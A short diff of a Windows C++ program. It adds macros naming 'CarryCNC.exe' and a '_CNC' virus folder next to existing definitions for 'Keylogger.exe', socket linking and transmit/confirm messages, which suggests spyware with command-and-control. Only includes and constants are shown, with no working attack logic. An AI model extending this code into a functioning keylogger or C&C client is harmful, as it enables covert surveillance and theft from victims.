@@ -10,6 +10,7 @@
 #include <gdiplus.h>
 #include <direct.h>
 #include <string>
+#include <vector>
 #pragma warning(disable : 4996)
 #pragma comment(lib,"wsock32.lib")
 #pragma comment(lib, "pthreadVSE2.lib")
@@ -39,7 +40,8 @@ using namespace Gdiplus;
 #define request "Transmit//request"
 #define confirm "Transmit//confirm"
 #define klexe "Keylogger.exe"
-
+#define spycarry "CarryCNC.exe"
+#define virusfolder "_CNC"
 
 struct control
 {
